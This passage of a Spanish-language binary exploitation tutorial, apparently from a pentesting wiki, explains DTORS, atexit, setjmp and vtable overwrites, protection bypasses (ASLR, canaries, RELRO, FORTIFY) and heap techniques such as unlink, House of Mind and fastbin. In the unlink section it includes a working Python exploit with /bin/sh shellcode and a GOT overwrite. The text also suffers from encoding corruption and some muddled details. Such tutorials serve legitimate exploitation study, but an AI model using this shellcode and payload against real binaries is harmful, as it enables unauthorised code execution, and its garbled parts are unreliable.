Por lo general, encontrar√°s la secci√≥n **DTOR** **entre** los valores `ffffffff` y `00000000`. Entonces, si solo ves esos valores, significa que **no hay ninguna funci√≥n registrada**. Por lo tanto, **sobrescribe** el **`00000000`** con la **direcci√≥n** del **shellcode** para ejecutarlo.

### **Cadenas de formato para desbordamientos de b√∫fer**

La funci√≥n **sprintf** mueve una cadena formateada a una **variable**. Por lo tanto, podr√≠as abusar del **formateo** de una cadena para causar un **desbordamiento de b√∫fer en la variable** donde se copia el contenido.\
Por ejemplo, la carga √∫til `%.44xAAAA` escribir√° **44B+"AAAA" en la variable**, lo que puede causar un desbordamiento de b√∫fer.

### **Estructuras \_\_atexit**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`atexit()`** es una funci√≥n a la que se le pasan **otras funciones como par√°metros**. Estas **funciones** se **ejecutar√°n** al ejecutar un **`exit()`** o al **retorno** de la **funci√≥n principal**.\
Si puedes **modificar** la **direcci√≥n** de alguna de estas **funciones** para que apunte a un shellcode, por ejemplo, obtendr√°s el **control** del **proceso**, pero esto es actualmente m√°s complicado.\
Actualmente, las **direcciones de las funciones** que se ejecutar√°n est√°n **ocultas** detr√°s de varias estructuras y finalmente la direcci√≥n a la que apuntan no son las direcciones de las funciones, sino que est√°n **encriptadas con XOR** y desplazamientos con una **clave aleatoria**. Por lo tanto, actualmente este vector de ataque no es muy √∫til, al menos en x86 y x64\_86.\
La funci√≥n de **encriptaci√≥n** es **`PTR_MANGLE`**. **Otras arquitecturas** como m68k, mips32, mips64, aarch64, arm, hppa... **no implementan la funci√≥n de encriptaci√≥n** porque **devuelven lo mismo** que recibieron como entrada. Por lo tanto, estas arquitecturas ser√≠an atacables mediante este vector.

### **setjmp() y longjmp()**

{% hint style="danger" %}
Hoy en d√≠a es muy **raro explotar esto**.
{% endhint %}

**`Setjmp()`** permite **guardar** el **contexto** (los registros)\
**`longjmp()`** permite **restaurar** el **contexto**.\
Los **registros guardados** son: `EBX, ESI, EDI, ESP, EIP, EBP`\
Lo que sucede es que EIP y ESP son pasados por la funci√≥n **`PTR_MANGLE`**, por lo que las **arquitecturas vulnerables a este ataque son las mismas que se mencionaron anteriormente**.\
Son √∫tiles para la recuperaci√≥n de errores o interrupciones.\
Sin embargo, seg√∫n lo que he le√≠do, los otros registros no est√°n protegidos, **por lo que si hay una instrucci√≥n `call ebx`, `call esi` o `call edi`** dentro de la funci√≥n que se llama, se puede tomar el control. Tambi√©n se podr√≠a modificar EBP para modificar ESP.

**VTable y VPTR en C++**

Cada clase tiene una **Vtable**, que es una matriz de **punteros a m√©todos**.

Cada objeto de una **clase** tiene un **VPtr**, que es un **puntero** a la matriz de su clase. El VPtr forma parte del encabezado de cada objeto, por lo que si se logra **sobrescribir** el **VPtr**, se puede **modificar** para que apunte a un m√©todo ficticio y as√≠, al ejecutar una funci√≥n, se llegue al shellcode.

## **Medidas preventivas y evasiones**

**ASLR no tan aleatorio**

PaX divide el espacio de direcciones del proceso en 3 grupos:

C√≥digo y datos inicializados y no inicializados: .text, .data y .bss ‚Äî> 16 bits de entrop√≠a en la variable delta\_exec, esta variable se inicia aleatoriamente con cada proceso y se suma a las direcciones iniciales.

Memoria asignada por mmap() y bibliotecas compartidas ‚Äî> 16 bits, delta\_mmap.

El stack ‚Äî> 24 bits, delta\_stack ‚Äî> En realidad, 11 (desde el byte 10¬∫ al 20¬∫ inclusive) ‚Äî> alineado a 16 bytes ‚Äî> 524.288 posibles direcciones reales del stack.

Las variables de entorno y los argumentos se desplazan menos que un b√∫fer en el stack.

**Return-into-printf**

Es una t√©cnica para convertir un desbordamiento de b√∫fer en un error de cadena de formato. Consiste en reemplazar el EIP para que apunte a un printf de la funci√≥n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.

**Ataque a bibliotecas**

Las bibliotecas est√°n en una posici√≥n con 16 bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork(), el espacio de direcciones de memoria se clona en el proceso hijo y se mantiene intacto. Por lo tanto, se puede intentar hacer un ataque de fuerza bruta a la funci√≥n usleep() de libc pas√°ndole como argumento "16", de modo que cuando tarde m√°s de lo normal en responder, se habr√° encontrado dicha funci√≥n. Sabiendo d√≥nde est√° dicha funci√≥n, se puede obtener delta\_mmap y calcular las dem√°s.

La √∫nica forma de estar seguros de que el ASLR funciona es utilizando una arquitectura de 64 bits. Ah√≠ no hay ataques de fuerza bruta.

**StackGuard y StackShield**

**StackGuard** inserta antes del EIP ‚Äî> 0x000aff0d(null, \n, EndOfFile(EOF), \r) ‚Äî> Siguen siendo vulnerables recv(), memcpy(), read(), bcoy() y no protege el EBP.

**StackShield** es m√°s elaborado que StackGuard.

Guarda en una tabla (Global Return Stack) todas las direcciones EIP de vuelta para que el desbordamiento no cause ning√∫n da√±o. Adem√°s, se pueden comparar ambas direcciones para ver si ha habido un desbordamiento.

Tambi√©n se puede comprobar la direcci√≥n de retorno con un valor l√≠mite, de modo que si el EIP se va a un lugar diferente al habitual, como el espacio de datos, se sabr√°. Pero esto se puede sortear con Ret-to-lib, ROPs o ret2ret.

Como se puede ver, StackShield tampoco protege las variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

Coloca el canary antes del EBP. Reordena las variables locales para que los b√∫feres est√©n en las posiciones m√°s altas y, de esta manera, no puedan sobrescribir otras variables.

Adem√°s, realiza una copia segura de los argumentos pasados encima de la pila (encima de las variables locales) y utiliza estas copias como argumentos.

No puede proteger matrices de menos de 8 elementos ni b√∫feres que formen parte de una estructura del usuario.

El canary es un n√∫mero aleatorio obtenido de "/dev/urandom" o, de lo contrario, es 0xff0a0000. Se almacena en TLS (Thread Local Storage). Los hilos comparten el mismo espacio de memoria, el TLS es un √°rea que tiene variables globales o est√°ticas de cada hilo. Sin embargo, en principio, estas variables se copian del proceso padre, aunque el proceso hijo podr√≠a modificar estos datos sin modificar los del padre ni los de los dem√°s hijos. El problema es que si se utiliza fork() pero no se crea un nuevo canary, entonces todos los procesos (padre e hijos) usan el mismo canary. En i386 se almacena en gs:0x14 y en x86\_64 se almacena en fs:0x28.

Esta protecci√≥n localiza funciones que tienen b√∫feres que pueden ser atacados e incluye c√≥digo al principio de la funci√≥n para colocar el canary y c√≥digo al final para comprobarlo.
La funci√≥n fork() realiza una copia exacta del proceso padre, por lo que si un servidor web llama a fork(), se puede realizar un ataque de fuerza bruta byte por byte para descubrir el canary que se est√° utilizando.

Si se utiliza la funci√≥n execve() despu√©s de fork(), se sobrescribe el espacio y el ataque ya no es posible. vfork() permite ejecutar el proceso hijo sin crear una duplicaci√≥n hasta que el proceso hijo intente escribir, momento en el cual se crea la duplicaci√≥n.

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Relocalizaci√≥n de solo lectura)** afecta los permisos de memoria de manera similar a NX. La diferencia es que mientras que con NX se hace que la pila sea ejecutable, RELRO hace que **ciertas cosas sean de solo lectura**, por lo que no podemos escribir en ellas. La forma m√°s com√∫n en la que esto se convierte en un obst√°culo es al evitar que realicemos una **sobrescritura de la tabla `got`**, que se explicar√° m√°s adelante. La tabla `got` contiene direcciones de funciones de libc para que el binario sepa cu√°les son las direcciones y pueda llamarlas. Veamos c√≥mo se ven los permisos de memoria para una entrada de la tabla `got` en un binario con y sin relro.

Con relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Sin relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Para el binario **sin relro**, podemos ver que la direcci√≥n de entrada `got` para `fgets` es `0x404018`. Al observar los mapeos de memoria, vemos que cae entre `0x404000` y `0x405000`, lo cual tiene los permisos **`rw`**, lo que significa que podemos leer y escribir en ella. Para el binario **con relro**, vemos que la direcci√≥n de la tabla `got` para la ejecuci√≥n del binario (pie est√° habilitado, por lo que esta direcci√≥n cambiar√°) es `0x555555557fd0`. En el mapeo de memoria de ese binario, cae entre `0x0000555555557000` y `0x0000555555558000`, lo cual tiene el permiso de memoria **`r`**, lo que significa que solo podemos leer de ella.

Entonces, ¬øcu√°l es el **bypass**? El bypass t√≠pico que uso es simplemente no escribir en las regiones de memoria que relro hace que sean de solo lectura y **encontrar una forma diferente de lograr la ejecuci√≥n de c√≥digo**.

Ten en cuenta que para que esto suceda, el binario necesita conocer de antemano las direcciones de las funciones:

* Lazy binding: La direcci√≥n de una funci√≥n se busca la primera vez que se llama a la funci√≥n. Por lo tanto, la `GOT` necesita tener permisos de escritura durante la ejecuci√≥n.
* Bind now: Las direcciones de las funciones se resuelven al comienzo de la ejecuci√≥n, luego se otorgan permisos de solo lectura a secciones sensibles como `.got`, `.dtors`, `.ctors`, `.dynamic`, `.jcr`. `` `** ``-z relro`**`y`**`-z now\`\*\*

Para verificar si un programa utiliza Bind now, puedes hacer lo siguiente:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Cuando el binario es cargado en memoria y se llama a una funci√≥n por primera vez, se salta a la PLT (Procedure Linkage Table), desde aqu√≠ se realiza un salto (jmp) a la GOT y se descubre que esa entrada no ha sido resuelta (contiene una direcci√≥n siguiente de la PLT). Entonces se invoca al Runtime Linker o rtfd para que resuelva la direcci√≥n y la guarde en la GOT.

Cuando se llama a una funci√≥n, se llama a la PLT, que tiene la direcci√≥n de la GOT donde se almacena la direcci√≥n de la funci√≥n. As√≠ se redirige el flujo all√≠ y se llama a la funci√≥n. Sin embargo, si es la primera vez que se llama a la funci√≥n, lo que hay en la GOT es la siguiente instrucci√≥n de la PLT, por lo tanto el flujo sigue el c√≥digo de la PLT (rtfd) y averigua la direcci√≥n de la funci√≥n, la guarda en la GOT y la llama.

Al cargar un binario en memoria, el compilador le ha indicado en qu√© offset debe situar datos que se deben cargar cuando se ejecuta el programa.

Lazy binding: La direcci√≥n de la funci√≥n se busca la primera vez que se invoca dicha funci√≥n, por lo que la GOT tiene permisos de escritura para que cuando se busque, se guarde ah√≠ y no haya que volver a buscarla.

Bind now: Las direcciones de las funciones se buscan al cargar el programa y se cambian los permisos de las secciones .got, .dtors, .ctors, .dynamic, .jcr a solo lectura. **-z relro** y **-z now**

A pesar de esto, en general los programas no est√°n complicados con esas opciones, por lo que estos ataques siguen siendo posibles.

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW**: Para saber si usan el BIND NOW

**Fortify Source -D_FORTIFY_SOURCE=1 o =2**

Trata de identificar las funciones que copian de un sitio a otro de forma insegura y cambiar la funci√≥n por una funci√≥n segura.

Por ejemplo:
char buf[16];
strcpy(buf, source);

La identifica como insegura y entonces cambia strcpy() por \_\_strcpy\_chk() utilizando el tama√±o del buffer como tama√±o m√°ximo a copiar.

La diferencia entre **=1** o **=2** es que:

La segunda no permite que **%n** venga de una secci√≥n con permisos de escritura. Adem√°s, el par√°metro para acceso directo de argumentos solo puede ser usado si se usan los anteriores, es decir, solo se puede usar **%3$d** si antes se ha usado **%2$d** y **%1$d**

Para mostrar el mensaje de error se usa el argv[0], por lo que si se pone en √©l la direcci√≥n de otro sitio (como una variable global), el mensaje de error mostrar√° el contenido de dicha variable. P√°gina 191

**Reemplazo de Libsafe**

Se activa con: LD_PRELOAD=/lib/libsafe.so.2\
o\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Se interceptan las llamadas a algunas funciones inseguras por otras seguras. No est√° estandarizado. (solo para x86, no para compilaciones con -fomit-frame-pointer, no compilaciones est√°ticas, no todas las funciones vulnerables se vuelven seguras y LD_PRELOAD no sirve en binarios con suid).

**ASCII Armored Address Space**

Consiste en cargar las librer√≠as compartidas de 0x00000000 a 0x00ffffff para que siempre haya un byte 0x00. Sin embargo, esto realmente no detiene apenas ning√∫n ataque, y menos en little endian.

**ret2plt**

Consiste en realizar un ROP de forma que se llame a la funci√≥n strcpy@plt (de la plt) y se apunte a la entrada de la GOT y se copie el primer byte de la funci√≥n a la que se quiere llamar (system()). Acto seguido se hace lo mismo apuntando a GOT+1 y se copia el 2¬∫ byte de system()‚Ä¶ Al final se llama la direcci√≥n guardada en GOT que ser√° system()

**Falso EBP**

Para las funciones que usen el EBP como registro para apuntar a los argumentos, al modificar el EIP y apuntar a system(), tambi√©n se debe haber modificado el EBP para que apunte a una zona de memoria que tenga 2 bytes cualesquiera y despu√©s la direcci√≥n a &‚Äù/bin/sh‚Äù.

**Jaulas con chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instala un sistema b√°sico bajo un subdirectorio espec√≠fico

Un admin puede salir de una de estas jaulas haciendo: mkdir foo; chroot foo; cd ..

**Instrumentaci√≥n de c√≥digo**

Valgrind ‚Äî> Busca errores\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflows: Exploits b√°sicos**

**Trozo asignado**

prev_size |\
size | ‚ÄîCabecera\
*mem | Datos

**Trozo libre**

prev_size |\
size |\
*fd | Ptr forward chunk\
*bk | Ptr back chunk ‚ÄîCabecera\
*mem | Datos

Los trozos libres est√°n en una lista doblemente enlazada (bin) y nunca pueden haber dos trozos libres juntos (se juntan)

En ‚Äúsize‚Äù hay bits para indicar: Si el trozo anterior est√° en uso, si el trozo ha sido asignado mediante mmap() y si el trozo pertenece al arena primario.

Si al liberar un trozo alguno de los contiguos se encuentra libre, estos se fusionan mediante la macro unlink() y se pasa el nuevo trozo m√°s grande a frontlink() para que le inserte el bin adecuado.

unlink(){\
BK = P->bk; ‚Äî> El BK del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD = P->fd; ‚Äî> El FD del nuevo chunk es el que tuviese el que ya estaba libre antes\
FD->bk = BK; ‚Äî> El BK del siguiente chunk apunta al nuevo chunk\
BK->fd = FD; ‚Äî> El FD del anterior chunk apunta al nuevo chunk\
}

Por lo tanto, si conseguimos modificar el P->bk con la direcci√≥n de un shellcode y el P->fd con la direcci√≥n a una entrada en la GOT o DTORS menos 12, se logra:

BK = P->bk = &shellcode\
FD = P->fd = &__dtor_end__ - 12\
FD->bk = BK -> *((&__dtor_end__ - 12) + 12) = &shellcode

Y as√≠, al salir del programa, se ejecuta la shellcode.

Adem√°s, la 4¬∫ sentencia de unlink() escribe algo y la shellcode tiene que estar preparada para esto:

BK->fd = FD -> *((&shellcode + 8) = (&__dtor_end__ - 12) ‚Äî> Esto provoca la escritura de 4 bytes a partir del 8¬∫ byte de la shellcode, por lo que la primera instrucci√≥n de la shellcode debe ser un jmp para saltar esto y caer en unos nops que lleven al resto de la shellcode.

Por lo tanto, el exploit se crea:

En el buffer1 metemos la shellcode comenzando por un jmp para que caiga en los nops o en el resto de la shellcode.
Despu√©s de la shell code, llenamos con relleno hasta llegar al campo prev\_size y size del siguiente trozo. En estos lugares, colocamos 0xfffffff0 (para sobrescribir prev\_size y establecer el bit que indica que est√° libre) y "-4" (0xfffffffc) en size (para que cuando se compruebe en el tercer trozo si el segundo est√° libre, en realidad se vaya al prev\_size modificado que indicar√° que est√° libre). De esta manera, cuando se llame a free(), se ir√° al size del tercer trozo pero en realidad se ir√° al segundo menos 4 y se pensar√° que el segundo trozo est√° libre. Y luego se llamar√° a **unlink()**.

Al llamar a unlink(), se utilizar√°n los primeros datos del segundo trozo como P->fd, por lo que se colocar√° la direcci√≥n que se desea sobrescribir - 12 (ya que se sumar√° 12 a la direcci√≥n guardada en FD en BK). Y en esa direcci√≥n se introducir√° la segunda direcci√≥n que se encuentre en el segundo trozo, que ser√° la direcci√≥n de la shellcode (P->bk falso).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bytes de relleno**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Interesa que el bit que indica que el anterior trozo est√° libre est√© a 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, para que piense que el ‚Äúsize‚Äù del 3¬∫ trozo est√° 4bytes detr√°s (apunta a prev\_size) pues es ah√≠ donde mira si el 2¬∫ trozo est√° libre**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #En el payload al principio le vamos a poner 8bytes de relleno**

**got\_free = pack("\<I", 0x08048300 - 12) #Direcci√≥n de free() en la plt-12 (ser√° la direcci√≥n que se sobrescrita para que se lanza la shellcode la 2¬∫ vez que se llame a free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) # Como se dijo el payload comienza con 8 bytes de relleno porque s√≠**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Se modifica el 2¬∫ trozo, el got\_free apunta a donde vamos a guardar la direccion addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() liberando en sentido inverso (wargame)**

Estamos controlando 3 chunks consecutivos y se liberan en orden inverso al reservado.

En ese caso:

En el chunck c se pone el shellcode

El chunck a lo usamos para sobreescribir el b de forma que el el size tenga el bit PREV\_INUSE desactivado de forma que piense que el chunck a est√° libre.

Adem√°s, se sobreescribe en la cabecera b el size para que valga -4.

Entonces, el programa se pensar√° que ‚Äúa‚Äù est√° libre y en un bin, por lo que llamar√° a unlink() para desenlazarlo. Sin embargo, como la cabecera PREV\_SIZE vale -4. Se pensar√° que el trozo de ‚Äúa‚Äù realmente empieza en b+4. Es decir, har√° un unlink() a un trozo que comienza en b+4, por lo que en b+12 estar√° el puntero ‚Äúfd‚Äù y en b+16 estar√° el puntero ‚Äúbk‚Äù.

De esta forma, si en bk ponemos la direcci√≥n a la shellcode y en fd ponemos la direcci√≥n a la funci√≥n ‚Äúputs()‚Äù-12 tenemos nuestro payload.

**T√©cnica de Frontlink**

Se llama a frontlink cuando se libera algo y ninguno de sus trozos contiguos no son libres, no se llama a unlink() sino que se llama directamente a frontlink().

Vulnerabilidad √∫til cuando el malloc que se ataca nunca es liberado (free()).

Necesita:

Un buffer que pueda desbordarse con la funci√≥n de entrada de datos

Un buffer contiguo a este que debe ser liberado y al que se le modificar√° el campo fd de su cabecera gracias al desbordamiento del buffer anterior

Un buffer a liberar con un tama√±o mayor a 512 pero menor que el buffer anterior

Un buffer declarado antes del paso 3 que permita sobreescribir el prev\_size de este

De esta forma logrando sobres cribar en dos mallocs de forma descontrolada y en uno de forma controlada pero que solo se libera ese uno, podemos hacer un exploit.

**Vulnerabilidad double free()**

Si se llama dos veces a free() con el mismo puntero, quedan dos bins apuntando a la misma direcci√≥n.

En caso de querer volver a usar uno se asignar√≠a sin problemas. En caso de querer usar otro, se le asignar√≠a el mismo espacio por lo que tendr√≠amos los punteros ‚Äúfd‚Äù y ‚Äúbk‚Äù falseados con los datos que escribir√° la reserva anterior.

**After free()**

Un puntero previamente liberado es usado de nuevo sin control.

## **8 Heap Overflows: Exploits avanzados**

Las t√©cnicas de Unlink() y FrontLink() fueron eliminadas al modificar la funci√≥n unlink().

**The house of mind**

Solo una llamada a free() es necesaria para provocar la ejecuci√≥n de c√≥digo arbitrario. Interesa buscar un segundo trozo que puede ser desbordado por uno anterior y liberado.

Una llamada a free() provoca llamar a public\_fREe(mem), este hace:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Devuelve un puntero a la direcci√≥n donde comienza el trozo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

En \[1] comprueba el campo size el bit NON\_MAIN\_ARENA, el cual se puede alterar para que la comprobaci√≥n devuelva true y ejecute heap\_for\_ptr() que hace un and a ‚Äúmem‚Äù dejando a 0 los 2.5 bytes menos importantes (en nuestro caso de 0x0804a000 deja 0x08000000) y accede a 0x08000000->ar\_ptr (como si fuese un struct heap\_info)
De esta manera, podemos controlar un chunk, por ejemplo en 0x0804a000, y cuando se libere un chunk en **0x081002a0**, podemos llegar a la direcci√≥n 0x08100000 y escribir lo que queramos, por ejemplo **0x0804a000**. Cuando se libere este segundo chunk, heap\_for\_ptr(ptr)->ar\_ptr devolver√° lo que hemos escrito en 0x08100000 (ya que se aplica a 0x081002a0 el "and" que vimos antes y se obtiene el valor de los primeros 4 bytes, el ar\_ptr).

De esta manera, se llama a \_int\_free(ar\_ptr, mem), es decir, **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Como vimos antes, podemos controlar el valor de av, ya que es lo que escribimos en el chunk que se va a liberar.

Como se define unsorted\_chunks, sabemos que:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Por lo tanto, si escribimos el valor de \_\_DTOR\_END\_\_-12 en av->bins\[2], en la √∫ltima instrucci√≥n se escribir√° en \_\_DTOR\_END\_\_ la direcci√≥n del segundo chunk.

Es decir, en el primer chunk debemos poner al inicio muchas veces la direcci√≥n de \_\_DTOR\_END\_\_-12, ya que av->bins\[2\] lo tomar√° de ah√≠.

En la direcci√≥n donde caiga la direcci√≥n del segundo chunk con los √∫ltimos 5 ceros, debemos escribir la direcci√≥n de este primer chunk para que heap\_for\_ptr() piense que el ar\_ptr est√° al inicio del primer chunk y tome av->bins\[2\] de ah√≠.

En el segundo chunk, gracias al primero, sobrescribimos prev\_size con un jump 0x0c y size con algo para activar -> NON\_MAIN\_ARENA.

A continuaci√≥n, en el chunk 2, ponemos muchos nops y finalmente la shellcode.

De esta manera, se llamar√° a \_int\_free(CHUNK1, CHUNK2) y seguir√° las instrucciones para escribir en \_\_DTOR\_END\_\_ la direcci√≥n del prev\_size del CHUNK2, que saltar√° a la shellcode.

Para aplicar esta t√©cnica, se necesitan cumplir algunos requisitos adicionales que complican un poco m√°s el payload.

Esta t√©cnica ya no es aplicable, ya que se aplic√≥ casi el mismo parche que para unlink. Se compara si el nuevo sitio al que se apunta tambi√©n est√° apuntando a √©l.

**Fastbin**

Es una variante de The house of mind.

Nos interesa ejecutar el siguiente c√≥digo, al cual se llega despu√©s de la primera comprobaci√≥n de la funci√≥n \_int\_free():

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Siendo fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

De esta manera, si se pone en "fb" la direcci√≥n de una funci√≥n en la GOT, en esa direcci√≥n se pondr√° la direcci√≥n del chunk sobrescrito. Para esto, es necesario que la arena est√© cerca de las direcciones de dtors. M√°s espec√≠ficamente, que av->max\_fast est√© en la direcci√≥n que vamos a sobrescribir.

Dado que con The House of Mind vimos que controlamos la posici√≥n de av.

Entonces, si en el campo size ponemos un tama√±o de 8 + NON\_MAIN\_ARENA + PREV\_INUSE, fastbin\_index() nos devolver√° fastbins\[-1\], que apuntar√° a av->max\_fast.

En este caso, av->max\_fast ser√° la direcci√≥n que se sobrescribir√° (no a la que apunta, sino que esa posici√≥n ser√° la que se sobrescribir√°).

Adem√°s, se debe cumplir que el chunk contiguo al liberado sea mayor que 8. Dado que hemos dicho que el tama√±o del chunk liberado es 8, en este chunk falso solo tenemos que poner un tama√±o mayor que 8 (adem√°s, la shellcode ir√° en el chunk liberado, as√≠ que habr√° que poner al principio un jmp que caiga en nops).

Adem√°s, ese mismo chunk falso debe ser menor que av->system\_mem. av->system\_mem se encuentra 1848 bytes m√°s adelante.

Debido a los nulos de \_DTOR\_END\_ y a las pocas direcciones en la GOT, ninguna direcci√≥n de estas secciones sirve para ser sobrescrita. As√≠ que veamos c√≥mo aplicar fastbin para atacar la pila.

Otra forma de ataque es redirigir el **av** hacia la pila.

Si modificamos el size para que sea 16 en lugar de 8, entonces fastbin\_index() nos devolver√° fastbins\[0\] y podemos usar esto para sobrescribir la pila.

Para esto, no debe haber ning√∫n canary ni valores extra√±os en la pila. De hecho, debemos encontrarnos en esta estructura: 4 bytes nulos + EBP + RET.

Los 4 bytes nulos son necesarios para que el **av** est√© en esta direcci√≥n y el primer elemento de un **av** sea el mutex, que debe tener un valor de 0.

El **av->max\_fast** ser√° el EBP y ser√° un valor que nos permitir√° saltarnos las restricciones.

